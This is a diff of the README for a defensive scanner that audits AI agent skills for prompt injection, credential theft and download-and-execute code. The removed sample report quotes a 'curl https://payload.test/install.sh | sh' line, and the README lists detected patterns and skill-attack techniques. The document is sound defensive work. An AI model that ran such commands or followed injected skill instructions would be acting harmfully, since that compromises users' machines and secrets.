@@ -2,143 +2,132 @@
 
 # skill-security-auditor
 
-Codex skill security scanner for auditing `SKILL.md` instructions, scripts, hooks, and repository files for suspicious behavior.
+Check an agent skill before you install it. The skill is fetched into a quarantine folder and never run; you get a PASS, REVIEW or BLOCK verdict with the reasons, and if you agree, the exact files that were checked are installed and pinned so later changes are noticed.
 
-`skill-security-auditor` helps maintainers review third-party Codex skills and agent skills as supply-chain artifacts. It statically inspects agent-facing instructions and executable files for common risky patterns such as prompt injection, credential access, hidden behavior, dependency-install hooks, destructive file operations, and shell download-and-execute snippets.
+Works as a skill in Claude Code and Codex, and as a command line tool and CI step. Standard library Python 3.11+, no dependencies.
 
-Installed skill command: `$securityauditor`. In chat surfaces that expose slash skill invocation, use `/securityauditor`.
+## Quick start
 
-## What Is A Codex Skill Security Audit?
-
-A Codex skill security audit is a defensive review of the files that can shape an agent workflow. Skills can include instructions, references, scripts, examples, and optional UI metadata. That means a skill can influence both what an agent believes it should do and what local helper code may run.
-
-This scanner checks common risk signals before a skill is installed, shared, published, or used in CI.
-
-## Quick Start
-
-```powershell
-python -m pip install -r requirements-dev.txt
-python skills/securityauditor/scripts/scan_skill.py skills/securityauditor/examples/benign-skill
-python skills/securityauditor/scripts/scan_skill.py skills/securityauditor/examples/suspicious-skill --json --fail-on high
-```
-
-## Installation
-
-Copy `skills/securityauditor` into a Codex skills directory, then mention `$securityauditor` in chat. If the host chat UI supports slash skill invocation, `/securityauditor` should resolve to the same installed skill. You can also keep the repository checked out and invoke the scanner script directly.
-
-For development:
-
-```powershell
-python -m pip install -r requirements-dev.txt
-python -m pytest
-```
-
-The scanner itself uses only the Python standard library.
-
-## CLI Usage
-
-```powershell
-python skills/securityauditor/scripts/scan_skill.py <path>
-python skills/securityauditor/scripts/scan_skill.py <path> --json
-python skills/securityauditor/scripts/scan_skill.py <path> --fail-on high
-python skills/securityauditor/scripts/scan_skill.py <path> --max-file-size 1048576
-python skills/securityauditor/scripts/scan_skill.py <path> --include-deps
-```
-
-Exit codes:
-
-| Code | Meaning |
-| --- | --- |
-| `0` | No findings at or above the fail threshold. |
-| `1` | At least one finding is at or above the fail threshold. |
-| `2` | Invalid input or scanner error. |
-
-## What This Catches
-
-- Prompt text that tells an agent to ignore instructions, hide behavior, disclose credentials, or weaken safety controls.
-- Shell snippets such as `curl ... | sh`, `wget ... | bash`, PowerShell download-and-execute patterns, base64 decode followed by execution, and `subprocess(..., shell=True)`.
-- Runtime dependency installation and npm lifecycle hooks such as `postinstall`.
-- Credential access signals for `.env`, SSH keys, cloud credential files, GitHub tokens, full environment dumps, and suspicious hidden dotfile writes.
-- Broad destructive file operations such as recursive forced deletes.
-- Skill metadata that omits risky behavior present in sibling scripts.
-
-## Example Text Report
+In Claude Code or Codex, with the skill installed:
 
 ```text
-Skill Security Audit Report
-Scanned files: 3
-Skipped files: 0
-Errors: 0
-Findings: 2
-
-HIGH
-- [shell-curl-pipe] scripts/sample_risks.txt:3
-  Category: shell_risk
-  Message: Shell snippet downloads content and pipes it into a shell.
-  Evidence: # curl https://payload.test/install.sh | sh
-  Recommendation: Avoid download-and-execute patterns; require reviewable local scripts instead.
+/securityauditor https://github.com/owner/repo/tree/main/skills/some-skill
 ```
 
-## JSON Output
+From a terminal:
 
-JSON output is deterministic and suitable for CI:
-
-```json
-{
-  "summary": {
-    "scanned_files": 0,
-    "skipped_files": 0,
-    "errors": 0,
-    "findings": 0,
-    "findings_by_severity": {
-      "info": 0,
-      "low": 0,
-      "medium": 0,
-      "high": 0,
-      "critical": 0
-    }
-  },
-  "findings": [],
-  "skipped_files": [],
-  "errors": []
-}
+```powershell
+python skills/securityauditor/scripts/scan_skill.py check owner/repo/skills/some-skill
 ```
 
-## Severity Guide
+## What a verdict looks like
 
-| Severity | Meaning |
+```text
+PASS  notes-helper  12 files  0.4s
+can: read local files
+```
+
+```text
+BLOCK  pdf-tools  31 files  0.9s
+can: network (collect.example.test), download and run code, read credential files
+runs without asking: SessionStart hook -> hooks/hooks.json
+critical  secret-to-network  scripts/sync.py:4   Credential file contents are sent over the network
+critical  remote-exec        scripts/setup.sh:1  Downloads code and runs it
++3 more  full report: <path>
+```
+
+```text
+REVIEW  api-helper  9 files  0.3s
+can: network (api.vendor.example), use secret variables
+medium  secret-to-unknown-host  scripts/call.py:7  A secret is sent to a host with no known vendor
+not analyzed: assets/guide.pdf
+```
+
+- **BLOCK**: at least one high or critical finding. Do not install.
+- **REVIEW**: medium findings or files that could not be checked. Read the lines and decide.
+- **PASS**: nothing found. It is not proof that a skill is safe.
+
+`can:` lists what the skill is able to do. `runs without asking:` lists everything the agent host would run without a prompt (hooks, monitors, MCP servers, lifecycle scripts, pre-approved tools), because that is the part the host's own permission prompts do not show you.
+
+Unless the static checks already blocked the skill, the output also contains a capped, sanitized review packet. The agent's model reads it against a fixed rubric and may raise the verdict, never lower it. `--static` turns that off.
+
+## What it checks
+
+| Area | What is checked |
 | --- | --- |
-| `info` | Context useful during review. |
-| `low` | Minor signal that may need cleanup or documentation. |
-| `medium` | Risky pattern that should be reviewed before publication or installation. |
-| `high` | Strong risk signal that should usually block trust until resolved. |
-| `critical` | Credential or destructive behavior signal that needs immediate review. |
+| Runs without asking | Hooks, monitors, MCP server commands, inline commands in `SKILL.md`, `allowed-tools` pre-approvals, npm lifecycle scripts. Each command is analyzed and marked as checked or not. |
+| Download and run | Fetches piped, substituted, or saved and then executed, in shell, PowerShell, Python and JavaScript. |
+| Secrets leaving | Credential files or the whole environment read and sent out, followed through pipelines, variables and files. A secret sent to its own vendor is fine; to a raw IP, a webhook service or another vendor it is not. |
+| Hidden instructions | Unicode tag characters, zero-width runs, bidi overrides, HTML comments, image alt text, link titles, instructions split across lines, text addressed to a reviewer. |
+| Odd files | UTF-16 files and extensionless scripts are decoded and checked; anything that cannot be checked is listed. |
+| Install something else | Instructions to download and run an extra component as a "required" step. |
+| Lookalike source | Repository names that imitate a well-known skill repository under another owner. |
+| Says one thing, does another | Capabilities compared with what `SKILL.md` says the skill does. |
+| Meaning | Paraphrased and non-English instructions, by the model review. |
 
-## CI Usage
+Every check has a page with a flagged and a not-flagged example in [docs/checks](docs/checks). Star, fork and download counts are never used. How it fits together: [docs/design.md](docs/design.md).
+
+## Install and pin
+
+After a check, install the exact files that were checked:
+
+```powershell
+python skills/securityauditor/scripts/scan_skill.py install <check-id> --to <your skills folder>
+```
+
+This refuses a BLOCK verdict and a quarantine that changed since the check, copies the files without downloading anything again, and records them in `skill.lock.json`. You can also pin a folder you already have with `pin <folder>`.
+
+## Watching for changes
+
+```powershell
+python skills/securityauditor/scripts/scan_skill.py verify
+```
+
+`verify` reports any pinned skill whose files changed, in terms of new capabilities, new hosts, new things that run without asking and new findings. `verify --quiet` only compares hashes and prints nothing when nothing changed; [docs/hook-example.md](docs/hook-example.md) shows how to run it at session start. The tool never edits your agent settings itself. `diff <old> <new>` compares two versions of a skill directly.
+
+## Using it with SkillSpector
+
+If [NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) is installed (on `PATH`, or `SKILLSPECTOR_BIN`), `check` also runs it with its model stage off and takes the stricter verdict; the output says when it was used and which tool raised the verdict. SkillSpector looks up dependency names in a vulnerability database during a scan; `--no-external` turns it off.
+
+## CI
 
 ```yaml
-- run: python skills/securityauditor/scripts/scan_skill.py ./some-skill --json --fail-on high
+- uses: saroo98/skill-security-auditor@main
+  with:
+    path: skills
+    fail-on: high
 ```
 
-Use `--fail-on medium` for stricter review gates and `--include-deps` only when dependency directories are intentionally in scope.
+The action writes SARIF and uploads it to code scanning. For pre-commit, use the `skillaudit` hook from `.pre-commit-hooks.yaml`. On the command line, `scan <path> --format text|json|sarif|brief --fail-on LEVEL`.
 
-## Limitations
-
-This tool detects common static patterns. It does not execute code, inspect runtime behavior, verify maintainer intent, evaluate every obfuscation technique, or prove a skill is safe. Findings are review signals, not final judgments.
-
-## Security Model
-
-The scanner reads local text-like files, skips binary files, avoids common dependency and build directories by default, and does not make network requests. It does not modify scanned files and does not provide auto-fix behavior.
+Findings can be suppressed only by the person running the scan: `--config` with `[[suppress]]` entries that each carry a reason, or `--baseline` with a reason for every fingerprint. A suppression file or ignore comment inside a scanned skill is itself reported and never honored.
 
 ## Benchmark
 
-`bench/` holds an inert corpus of skill attacks and harmless look-alikes, stored as data and written out as real skill folders only in a temporary directory. `python -m bench.run` scores any scanner that has an adapter in `bench/adapters/`. Current results are in [bench/results/RESULTS.md](bench/results/RESULTS.md); model stages are off for every scanner in that table.
+`bench/` holds an inert corpus of skill attacks and harmless look-alikes, stored as data and written out as real folders only in a temporary directory (cases that antivirus software flags are scored in memory unless `--include-av-sensitive` is given). `python -m bench.run` scores any scanner with an adapter in `bench/adapters/`.
 
-Rules for the corpus: every case cites a public source for its technique, no case is removed to improve a number (this project's included), and maintainers of a scanner are told about its misses before results that name it are published.
+Results on 2026-11-27, model stages off for every scanner (full table: [bench/results/RESULTS.md](bench/results/RESULTS.md)):
+
+| Scanner | Static-scope attacks caught | Benign blocked |
+| --- | --- | --- |
+| skill-security-auditor 0.9.0 | 50/50 | 0/20 |
+| SkillSpector 2.13.7 | 11/49 | 1/20 |
+
+Read these numbers with care. Most cases were written by this project's authors while building its checks, so its own score on them is optimistic. The fairer measure of false alarms is a corpus of real, reputable skills (`python -m bench.fetch_real` and `--real`), which is not yet published.
+
+Corpus rules: every case cites a public source for its technique, no case is removed to improve a number (this project's included), and maintainers of a scanner are told about its misses before results that name it are published.
+
+## Limits
+
+- Static checks plus one bounded model review. The skill is never run, so behavior that only appears at run time is not seen.
+- Paraphrased and non-English instructions are left to the model review; a malicious package recognizable only by its name, and content fetched after review, are out of static scope.
+- Instructions phrased as third-person description ("this skill tells an agent to ...") are treated as documentation by the static checks.
+- Private repositories are not supported; no tokens are read or sent.
+- A PASS means nothing was found, not that a skill is safe.
 
 ## Contributing
 
-Contributions are welcome for additional rules, clearer examples, and lower-noise matching. See [CONTRIBUTING.md](CONTRIBUTING.md).
+See [CONTRIBUTING.md](CONTRIBUTING.md): how to add a check, a benchmark case or a scanner adapter.
 
 ## License
 
